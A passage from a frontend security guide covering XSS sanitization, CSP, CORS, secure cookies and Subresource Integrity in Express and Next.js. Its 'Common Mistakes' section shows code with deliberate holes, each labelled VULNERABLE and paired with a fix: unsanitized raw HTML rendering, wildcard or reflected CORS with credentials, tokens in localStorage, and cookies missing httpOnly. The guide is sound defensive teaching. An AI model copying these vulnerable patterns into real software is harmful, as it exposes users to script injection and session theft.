      dangerouslySetInnerHTML={{ __html: sanitized }}
    />
  );
}
```

URL sanitization utility that rejects `javascript:` and other dangerous protocols:

```typescript
const ALLOWED_PROTOCOLS = new Set(["https:", "http:", "mailto:"]);

export function sanitizeUrl(url: string): string {
  if (!url || typeof url !== "string") {
    return "about:blank";
  }

  // Allow relative URLs
  if (url.startsWith("/") && !url.startsWith("//")) {
    return url;
  }

  try {
    const parsed = new URL(url);
    if (ALLOWED_PROTOCOLS.has(parsed.protocol)) {
      return parsed.href;
    }
    return "about:blank";
  } catch {
    // Invalid URL
    return "about:blank";
  }
}

// Usage in components
function UserProfileLink({ url, label }: { url: string; label: string }) {
  return (
    <a
      href={sanitizeUrl(url)}
      target="_blank"
      rel="noopener noreferrer"
    >
      {label}
    </a>
  );
}
```

Markdown rendering pipeline with rehype-sanitize:

```typescript
import { unified } from "unified";
import remarkParse from "remark-parse";
import remarkRehype from "remark-rehype";
import rehypeSanitize, { defaultSchema } from "rehype-sanitize";
import rehypeStringify from "rehype-stringify";

const sanitizeSchema = {
  ...defaultSchema,
  attributes: {
    ...defaultSchema.attributes,
    a: ["href", "target", "rel"],
    img: ["src", "alt", "title"],
    code: ["className"], // For syntax highlighting class names
  },
  protocols: {
    href: ["https", "http", "mailto"],
    src: ["https", "http"],
  },
};

export async function renderMarkdown(markdown: string): Promise<string> {
  const result = await unified()
    .use(remarkParse)
    .use(remarkRehype)
    .use(rehypeSanitize, sanitizeSchema)
    .use(rehypeStringify)
    .process(markdown);

  return String(result);
}

// Usage
async function MarkdownContent({ source }: { source: string }) {
  const html = await renderMarkdown(source);
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}
```


### 2. Content Security Policy Configuration (Next.js + Express)

Next.js middleware that generates a nonce per request and sets a strict CSP header:

```typescript
// middleware.ts (Next.js)
import { NextRequest, NextResponse } from "next/server";
import crypto from "crypto";

export function middleware(request: NextRequest) {
  const nonce = crypto.randomBytes(16).toString("base64");

  // Strict CSP with nonce-based script loading
  const cspHeader = [
    `default-src 'self'`,
    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,
    `style-src 'self' 'nonce-${nonce}'`,
    `img-src 'self' https://cdn.example.com data:`,
    `font-src 'self' https://fonts.gstatic.com`,
    `connect-src 'self' https://api.example.com`,
    `frame-ancestors 'none'`,
    `object-src 'none'`,
    `base-uri 'self'`,
    `form-action 'self'`,
    `upgrade-insecure-requests`,
  ].join("; ");

  const response = NextResponse.next();

  // Set the CSP header
  response.headers.set("Content-Security-Policy", cspHeader);

  // Pass the nonce to the page via a custom header
  response.headers.set("X-Nonce", nonce);

  // Additional security headers
  response.headers.set("X-Frame-Options", "DENY");
  response.headers.set("X-Content-Type-Options", "nosniff");
  response.headers.set("Referrer-Policy", "strict-origin-when-cross-origin");
  response.headers.set(
    "Permissions-Policy",
    "camera=(), microphone=(), geolocation=()"
  );

  return response;
}

export const config = {
  matcher: [
    // Match all paths except static files and API routes
    "/((?!_next/static|_next/image|favicon.ico).*)",
  ],
};
```

Report-only CSP for testing before enforcement:

```typescript
// Use this header during the testing phase
const reportOnlyCsp = [
  `default-src 'self'`,
  `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,
  `style-src 'self' 'nonce-${nonce}'`,
  `img-src 'self' https://cdn.example.com`,
  `connect-src 'self' https://api.example.com`,
  `frame-ancestors 'none'`,
  `object-src 'none'`,
  `base-uri 'self'`,
  `form-action 'self'`,
  `report-uri /api/csp-report`,
].join("; ");

// Set as report-only — violations are logged but not blocked
response.headers.set("Content-Security-Policy-Report-Only", reportOnlyCsp);
```

Express application with helmet CSP configuration:

```typescript
import express from "express";
import helmet from "helmet";
import crypto from "crypto";

const app = express();

app.use((req, res, next) => {
  // Generate a nonce for each request
  res.locals.cspNonce = crypto.randomBytes(16).toString("base64");
  next();
});

app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: [
          "'self'",
          (req, res) => `'nonce-${(res as any).locals.cspNonce}'`,
          "'strict-dynamic'",
        ],
        styleSrc: [
          "'self'",
          (req, res) => `'nonce-${(res as any).locals.cspNonce}'`,
        ],
        imgSrc: ["'self'", "https://cdn.example.com", "data:"],
        fontSrc: ["'self'", "https://fonts.gstatic.com"],
        connectSrc: ["'self'", "https://api.example.com"],
        frameAncestors: ["'none'"],
        objectSrc: ["'none'"],
        baseUri: ["'self'"],
        formAction: ["'self'"],
        upgradeInsecureRequests: [],
      },
    },
    crossOriginEmbedderPolicy: true,
    crossOriginOpenerPolicy: { policy: "same-origin" },
    crossOriginResourcePolicy: { policy: "same-origin" },
  })
);

// CSP violation report endpoint
app.post(
  "/api/csp-report",
  express.json({ type: "application/csp-report" }),
  (req, res) => {
    console.error("CSP Violation:", JSON.stringify(req.body, null, 2));
    // In production, send to your logging/monitoring service
    res.status(204).end();
  }
);

// Template rendering with nonce
app.get("/", (req, res) => {
  const nonce = res.locals.cspNonce;
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <script nonce="${nonce}" src="/js/app.js"></script>
      <link nonce="${nonce}" rel="stylesheet" href="/css/app.css">
    </head>
    <body>
      <div id="root"></div>
      <script nonce="${nonce}">
        // Inline scripts must include the nonce
        window.__APP_CONFIG__ = { apiUrl: "https://api.example.com" };
      </script>
    </body>
    </html>
  `);
});
```


### 3. CORS Middleware Configuration (Express)

Express CORS configuration with origin allowlist and environment-specific settings:

```typescript
import express from "express";
import cors from "cors";

const app = express();

// Parse allowed origins from environment variable
const ALLOWED_ORIGINS = (process.env.ALLOWED_ORIGINS ?? "")
  .split(",")
  .map((origin) => origin.trim())
  .filter(Boolean);

// Development defaults
if (process.env.NODE_ENV === "development") {
  ALLOWED_ORIGINS.push(
    "http://localhost:3000",
    "http://localhost:5173", // Vite default
    "http://localhost:4200"  // Angular default
  );
}

function isOriginAllowed(origin: string | undefined): boolean {
  // Allow requests with no origin (server-to-server, curl, mobile apps)
  if (!origin) return true;
  return ALLOWED_ORIGINS.includes(origin);
}

const corsOptions: cors.CorsOptions = {
  origin: (origin, callback) => {
    if (isOriginAllowed(origin)) {
      callback(null, origin);
    } else {
      callback(new Error(`Origin ${origin} not allowed by CORS`));
    }
  },

  // Allow credentials (cookies, Authorization header)
  credentials: true,

  // Allowed methods
  methods: ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"],

  // Allowed request headers
  allowedHeaders: [
    "Content-Type",
    "Authorization",
    "X-Requested-With",
    "Accept",
    "Origin",
  ],

  // Headers the client can read from the response
  exposedHeaders: [
    "X-Total-Count",
    "X-Page-Count",
    "X-Request-Id",
  ],

  // Cache preflight for 1 hour (reduces OPTIONS requests)
  maxAge: 3600,
};

app.use(cors(corsOptions));

// Handle CORS errors gracefully
app.use(
  (
    err: Error,
    req: express.Request,
    res: express.Response,
    next: express.NextFunction
  ) => {
    if (err.message.includes("not allowed by CORS")) {
      res.status(403).json({
        error: "CORS_ERROR",
        message: "This origin is not allowed to access this resource.",
      });
    } else {
      next(err);
    }
  }
);
```

Same-origin SPA + API pattern (frontend on port 3000, API on port 4000) with a reverse proxy:

```nginx
# nginx.conf — same-origin setup eliminates CORS entirely
server {
    listen 443 ssl;
    server_name app.example.com;

    # Frontend (React/Next.js)
    location / {
        proxy_pass http://localhost:3000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }

    # API — same origin, no CORS needed
    location /api/ {
        proxy_pass http://localhost:4000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```


### 4. Secure Cookie Setup (Express + Next.js)

Express cookie configuration for authentication:

```typescript
import express from "express";
import crypto from "crypto";

const app = express();

const IS_PRODUCTION = process.env.NODE_ENV === "production";

// Cookie configuration constants
const SESSION_COOKIE_NAME = IS_PRODUCTION ? "__Host-session" : "session";
const REFRESH_COOKIE_NAME = IS_PRODUCTION ? "__Host-refresh" : "refresh";

const COOKIE_DEFAULTS: express.CookieOptions = {
  httpOnly: true,
  secure: IS_PRODUCTION,
  sameSite: "lax",
  path: "/",
};

// Set authentication cookies after login
function setAuthCookies(
  res: express.Response,
  sessionToken: string,
  refreshToken: string
): void {
  // Session cookie — 24 hours
  res.cookie(SESSION_COOKIE_NAME, sessionToken, {
    ...COOKIE_DEFAULTS,
    maxAge: 24 * 60 * 60 * 1000, // 24 hours in ms
  });

  // Refresh token cookie — 30 days
  res.cookie(REFRESH_COOKIE_NAME, refreshToken, {
    ...COOKIE_DEFAULTS,
    maxAge: 30 * 24 * 60 * 60 * 1000, // 30 days in ms
    path: "/api/auth/refresh", // Only sent to the refresh endpoint
  });
}

// Clear authentication cookies on logout
function clearAuthCookies(res: express.Response): void {
  // Attributes must match the original cookie for clearing to work
  res.clearCookie(SESSION_COOKIE_NAME, {
    httpOnly: true,
    secure: IS_PRODUCTION,
    sameSite: "lax",
    path: "/",
  });

  res.clearCookie(REFRESH_COOKIE_NAME, {
    httpOnly: true,
    secure: IS_PRODUCTION,
    sameSite: "lax",
    path: "/api/auth/refresh",
  });
}

// Login endpoint
app.post("/api/auth/login", async (req, res) => {
  const { email, password } = req.body;

  // Validate credentials (implementation depends on your auth system)
  const user = await authenticateUser(email, password);
  if (!user) {
    return res.status(401).json({ error: "Invalid credentials" });
  }

  // Generate tokens
  const sessionToken = crypto.randomBytes(32).toString("hex");
  const refreshToken = crypto.randomBytes(32).toString("hex");

  // Store session in database
  await createSession(user.id, sessionToken, refreshToken);

  // Set secure cookies
  setAuthCookies(res, sessionToken, refreshToken);

  res.json({ user: { id: user.id, email: user.email } });
});

// Logout endpoint
app.post("/api/auth/logout", async (req, res) => {
  const sessionToken = req.cookies[SESSION_COOKIE_NAME];
  if (sessionToken) {
    await deleteSession(sessionToken);
  }

  clearAuthCookies(res);
  res.json({ success: true });
});

// Placeholder functions — implement with your database
async function authenticateUser(email: string, password: string) {
  // Verify email/password against database
  return { id: "user-123", email };
}

async function createSession(
  userId: string,
  sessionToken: string,
  refreshToken: string
) {
  // Store session in database with expiry
}

async function deleteSession(sessionToken: string) {
  // Remove session from database
}
```

Next.js Route Handler cookie configuration:

```typescript
// app/api/auth/login/route.ts (Next.js App Router)
import { NextRequest, NextResponse } from "next/server";
import { cookies } from "next/headers";
import crypto from "crypto";

const IS_PRODUCTION = process.env.NODE_ENV === "production";
const SESSION_COOKIE = IS_PRODUCTION ? "__Host-session" : "session";

export async function POST(request: NextRequest) {
  const { email, password } = await request.json();

  // Authenticate user
  const user = await authenticateUser(email, password);
  if (!user) {
    return NextResponse.json(
      { error: "Invalid credentials" },
      { status: 401 }
    );
  }

  const sessionToken = crypto.randomBytes(32).toString("hex");
  await createSession(user.id, sessionToken);

  // Set cookie using Next.js cookies API
  const cookieStore = await cookies();
  cookieStore.set(SESSION_COOKIE, sessionToken, {
    httpOnly: true,
    secure: IS_PRODUCTION,
    sameSite: "lax",
    path: "/",
    maxAge: 24 * 60 * 60, // 24 hours in seconds
  });

  return NextResponse.json({ user: { id: user.id, email: user.email } });
}
```

```typescript
// app/api/auth/logout/route.ts (Next.js App Router)
import { NextResponse } from "next/server";
import { cookies } from "next/headers";

const IS_PRODUCTION = process.env.NODE_ENV === "production";
const SESSION_COOKIE = IS_PRODUCTION ? "__Host-session" : "session";

export async function POST() {
  const cookieStore = await cookies();
  const sessionToken = cookieStore.get(SESSION_COOKIE)?.value;

  if (sessionToken) {
    await deleteSession(sessionToken);
  }

  // Clear the session cookie
  cookieStore.set(SESSION_COOKIE, "", {
    httpOnly: true,
    secure: IS_PRODUCTION,
    sameSite: "lax",
    path: "/",
    maxAge: 0, // Expire immediately
  });

  return NextResponse.json({ success: true });
}
```


### 5. Subresource Integrity for CDN Resources

Script and link tags with SRI attributes:

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">

  <!-- CSS with SRI — browser verifies hash before applying styles -->
  <link
    rel="stylesheet"
    href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
    integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7icsOvP0VoiEBhScYwmAGpqHgGKdqnSWKS"
    crossorigin="anonymous"
  >

  <!-- Font stylesheet — SRI ensures the CSS is not tampered with -->
  <link
    rel="stylesheet"
    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap"
    integrity="sha384-EXAMPLE_HASH_HERE"
    crossorigin="anonymous"
  >
</head>
<body>
  <div id="root"></div>

  <!-- JavaScript with SRI — browser refuses to execute if hash mismatches -->
  <script
    src="https://cdn.jsdelivr.net/npm/react@18.2.0/umd/react.production.min.js"
    integrity="sha384-tMH8h3BGESGckSAVGZ82T9n90ztNXxvdwvJwSEMCJcJBdAFNiHCqblYJFnKq62Kl"
    crossorigin="anonymous"
  ></script>

  <script
    src="https://cdn.jsdelivr.net/npm/react-dom@18.2.0/umd/react-dom.production.min.js"
    integrity="sha384-EXAMPLE_HASH_HERE"
    crossorigin="anonymous"
  ></script>

  <!-- Your own scripts from same origin — SRI not required but still useful -->
  <script src="/js/app.js"></script>
</body>
</html>
```

Node.js script to generate SRI hashes for local and remote files:

```typescript
// scripts/generate-sri.ts
import { createHash } from "crypto";
import { readFileSync } from "fs";
import https from "https";

/**
 * Generate SRI hash for a local file
 */
function generateSriHash(
  filePath: string,
  algorithm: "sha256" | "sha384" | "sha512" = "sha384"
): string {
  const content = readFileSync(filePath);
  const hash = createHash(algorithm).update(content).digest("base64");
  return `${algorithm}-${hash}`;
}

/**
 * Generate SRI hash for a remote URL
 */
function generateSriHashFromUrl(
  url: string,
  algorithm: "sha256" | "sha384" | "sha512" = "sha384"
): Promise<string> {
  return new Promise((resolve, reject) => {
    https.get(url, (res) => {
      const chunks: Buffer[] = [];
      res.on("data", (chunk: Buffer) => chunks.push(chunk));
      res.on("end", () => {
        const content = Buffer.concat(chunks);
        const hash = createHash(algorithm).update(content).digest("base64");
        resolve(`${algorithm}-${hash}`);
      });
      res.on("error", reject);
    });
  });
}

// CLI usage
async function main() {
  const target = process.argv[2];
  if (!target) {
    console.error("Usage: npx tsx scripts/generate-sri.ts <file-or-url>");
    process.exit(1);
  }

  let hash: string;
  if (target.startsWith("https://")) {
    hash = await generateSriHashFromUrl(target);
  } else {
    hash = generateSriHash(target);
  }

  console.log(`integrity="${hash}"`);
  console.log(`\nFull attribute: integrity="${hash}" crossorigin="anonymous"`);
}

main().catch(console.error);
```

Webpack configuration for automatic SRI generation:

```typescript
// webpack.config.ts
import { SubresourceIntegrityPlugin } from "webpack-subresource-integrity";
import HtmlWebpackPlugin from "html-webpack-plugin";

export default {
  output: {
    // crossOriginLoading is required for SRI to work
    crossOriginLoading: "anonymous" as const,
    filename: "[name].[contenthash].js",
    publicPath: "https://cdn.example.com/assets/",
  },
  plugins: [
    new HtmlWebpackPlugin({
      template: "./src/index.html",
    }),
    new SubresourceIntegrityPlugin({
      hashFuncNames: ["sha384"],
      // Enable for all chunks including async chunks
      enabled: process.env.NODE_ENV === "production",
    }),
  ],
};
```

---

## Common Mistakes

### 1. Using `dangerouslySetInnerHTML` with Unsanitized Input

**Wrong:** Passing user-provided HTML directly to `dangerouslySetInnerHTML`, `v-html`, or `{@html}` without sanitization. This is the most common XSS vector in modern frontend frameworks. Developers assume "my framework handles security" without realizing that these APIs explicitly bypass all framework protections.

```tsx
// VULNERABLE — user input rendered as raw HTML
function Comment({ body }: { body: string }) {
  return <div dangerouslySetInnerHTML={{ __html: body }} />;
}
```

**Fix:** Always sanitize with DOMPurify before using any raw HTML rendering API. Restrict the allowed tags and attributes to the minimum your feature requires.

```tsx
import DOMPurify from "dompurify";

function Comment({ body }: { body: string }) {
  const clean = DOMPurify.sanitize(body, {
    ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "br", "ul", "ol", "li"],
    ALLOWED_ATTR: ["href", "target", "rel"],
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```


### 2. `Access-Control-Allow-Origin: *` with Credentials

**Wrong:** Setting `Access-Control-Allow-Origin: *` on an API that also sets `Access-Control-Allow-Credentials: true`, or reflecting any `Origin` header without validation. This allows any website on the internet to make authenticated requests to your API and read the responses.

```typescript
// VULNERABLE — allows any origin with credentials
app.use(cors({
  origin: "*",
  credentials: true, // This combination is dangerous
}));

// ALSO VULNERABLE — reflecting origin without validation
app.use(cors({
  origin: (origin, callback) => {
    callback(null, origin); // Reflects any origin — same as *
  },
  credentials: true,
}));
```

**Fix:** Maintain an explicit allowlist of trusted origins. Only reflect origins that are in the list.

```typescript
const ALLOWED_ORIGINS = ["https://app.example.com", "https://admin.example.com"];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || ALLOWED_ORIGINS.includes(origin)) {
      callback(null, origin);
    } else {
      callback(new Error("Not allowed by CORS"));
    }
  },
  credentials: true,
}));
```


### 3. Storing JWTs or Tokens in localStorage

**Wrong:** Storing authentication tokens in `localStorage` because "it's easier than cookies." A single XSS vulnerability lets an attacker steal all tokens with one line of JavaScript.

```typescript
// VULNERABLE — tokens accessible to any script on the page
async function login(email: string, password: string) {
  const response = await fetch("/api/auth/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email, password }),
  });
  const { accessToken, refreshToken } = await response.json();

  localStorage.setItem("accessToken", accessToken);   // Vulnerable
  localStorage.setItem("refreshToken", refreshToken); // Vulnerable
}
```

**Fix:** Store tokens in httpOnly cookies that JavaScript cannot access. Adjust the API to set cookies server-side.

```typescript
// Server sets httpOnly cookies — JavaScript never sees the tokens
async function login(email: string, password: string) {
  const response = await fetch("/api/auth/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email, password }),
    credentials: "include", // Tells browser to accept cookies
  });
  const { user } = await response.json();
  // Token is in an httpOnly cookie — no client-side storage needed
  return user;
}

// Subsequent requests automatically include the cookie
async function fetchProfile() {
  const response = await fetch("/api/profile", {
    credentials: "include", // Browser attaches the cookie
  });
  return response.json();
}
```


### 4. No Content Security Policy

**Wrong:** Deploying an application without any CSP header. This means the browser allows scripts from any source, inline scripts, `eval()`, and everything else. Any XSS vulnerability has maximum impact.

**Fix:** Add a CSP header. Start with report-only mode to avoid breaking things, then enforce.

```typescript
// Minimum viable CSP — add to your server or middleware
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'"],
      imgSrc: ["'self'"],
      connectSrc: ["'self'", "https://api.example.com"],
      frameAncestors: ["'none'"],
      objectSrc: ["'none'"],
      baseUri: ["'self'"],
    },
  },
}));
```


### 5. Missing `HttpOnly` on Authentication Cookies

**Wrong:** Setting authentication cookies without the `HttpOnly` flag, making them readable by JavaScript through `document.cookie`. An XSS attack can steal the cookie and exfiltrate it.

```typescript
// VULNERABLE — cookie is readable by JavaScript
res.cookie("session", token, {
  secure: true,
  sameSite: "lax",
  // Missing httpOnly: true
});
```

**Fix:** Always set `httpOnly: true` on authentication cookies. There is no legitimate reason for client-side JavaScript to read a session cookie.

```typescript
res.cookie("session", token, {
  httpOnly: true, // JavaScript cannot read this cookie
  secure: true,
  sameSite: "lax",
  path: "/",
  maxAge: 24 * 60 * 60 * 1000,
});
```


### 6. Disabling CORS "Because It Was Blocking My Requests"

**Wrong:** Encountering CORS errors during development and "fixing" them by setting `Access-Control-Allow-Origin: *` or installing a browser extension that disables CORS. The "fix" ships to production.

```typescript
// "It works now!" — in production, any website can read your API responses
app.use(cors({ origin: "*" }));
```

**Fix:** Understand WHY the request is blocked and configure CORS correctly. CORS errors mean the server is not explicitly allowing requests from your frontend's origin. Add your frontend origin to the allowlist.

```typescript
// Correct: only your frontend can access the API
app.use(cors({
  origin: process.env.FRONTEND_URL, // "https://app.example.com"
  credentials: true,
  methods: ["GET", "POST", "PUT", "PATCH", "DELETE"],
  allowedHeaders: ["Content-Type", "Authorization"],
}));
```

If your frontend and API are on the same origin, you do not need CORS at all. Use a reverse proxy to serve both from the same domain.


### 7. No `SameSite` Attribute on Cookies

**Wrong:** Setting cookies without a `SameSite` attribute, relying on browser defaults. While modern browsers default to `Lax`, older browsers default to `None`, making the cookie vulnerable to CSRF attacks.

```typescript
// RISKY — depends on browser default behavior
res.cookie("session", token, {
  httpOnly: true,
  secure: true,
  // No sameSite — older browsers send this cookie with cross-site requests
});
```

**Fix:** Always set `SameSite` explicitly. Use `Lax` as the default for authentication cookies.

```typescript
res.cookie("session", token, {
  httpOnly: true,
  secure: true,
  sameSite: "lax", // Explicit — no ambiguity across browsers
  path: "/",
});
```


### 8. Trusting Client-Side Input Validation as the Only Validation

**Wrong:** Validating input only in the browser (HTML5 `required`, `pattern`, `maxLength`, JavaScript checks) and assuming the server will receive clean data. Attackers bypass client-side validation trivially — by modifying the DOM, using DevTools, or sending requests directly with curl or Postman.

```typescript
// Client-side only validation — trivially bypassed
function handleSubmit(email: string, amount: number) {
  if (!email.includes("@")) return; // Bypassed with curl
  if (amount > 10000) return;       // Bypassed with curl

  fetch("/api/transfer", {
    method: "POST",
    body: JSON.stringify({ email, amount }),
  });
}
```

**Fix:** Client-side validation is for user experience. Server-side validation is for security. Always validate on the server, regardless of client-side checks.

```typescript
// Server-side validation — cannot be bypassed by the client
app.post("/api/transfer", async (req, res) => {
  const { email, amount } = req.body;

  // Validate on the server — this is the real security boundary
  if (typeof email !== "string" || !email.includes("@") || email.length > 254) {
    return res.status(400).json({ error: "Invalid email" });
  }
  if (typeof amount !== "number" || amount <= 0 || amount > 10000) {
    return res.status(400).json({ error: "Invalid amount" });
  }

  // Process the validated input
  await processTransfer(email, amount);
  res.json({ success: true });
});
```


### 9. Loading Scripts from CDNs Without SRI

**Wrong:** Loading third-party scripts from a CDN without Subresource Integrity attributes. If the CDN is compromised, every user of your site executes the attacker's code.

```html
<!-- VULNERABLE — no integrity check, no crossorigin attribute -->
<script src="https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"></script>
<link rel="stylesheet" href="https://cdn.example.com/styles.css">
```

**Fix:** Generate and include SRI hashes for every externally loaded script and stylesheet. Include the `crossorigin="anonymous"` attribute.

```html
<script
  src="https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"
  integrity="sha384-VALID_HASH_HERE"
  crossorigin="anonymous"
></script>
<link
  rel="stylesheet"
  href="https://cdn.example.com/styles.css"
  integrity="sha384-VALID_HASH_HERE"
  crossorigin="anonymous"
>
```


### 10. Not Setting `rel="noopener"` on `target="_blank"` Links

**Wrong:** Opening external links with `target="_blank"` without `rel="noopener noreferrer"`. In older browsers, the opened page can access `window.opener` and redirect the original tab to a phishing page.

```html
<!-- VULNERABLE in older browsers — opened page can manipulate opener -->
<a href="https://external-site.com" target="_blank">Visit Site</a>
```

**Fix:** Always add `rel="noopener noreferrer"` to links with `target="_blank"`. Modern browsers default to `noopener`, but the explicit attribute ensures compatibility and code clarity.

```html
<a
  href="https://external-site.com"
  target="_blank"
  rel="noopener noreferrer"
>
  Visit Site
</a>
```

In React, create a reusable component so you never forget:

```tsx
interface ExternalLinkProps {
  href: string;
  children: React.ReactNode;
  className?: string;
}

function ExternalLink({ href, children, className }: ExternalLinkProps) {
  return (
    <a
      href={href}
      target="_blank"
      rel="noopener noreferrer"
      className={className}
    >
      {children}
    </a>
  );
}
```

---

> **See also:** [Authentication-Identity](../Authentication-Identity/authentication-identity.md) | [Security-Headers-Infrastructure](../Security-Headers-Infrastructure/security-headers-infrastructure.md) | [Backend-Security](../Backend-Security/backend-security.md) | [API-Security](../API-Security/api-security.md) | [Data-Protection](../Data-Protection/data-protection.md)
>
> **Last reviewed:** 2026-02
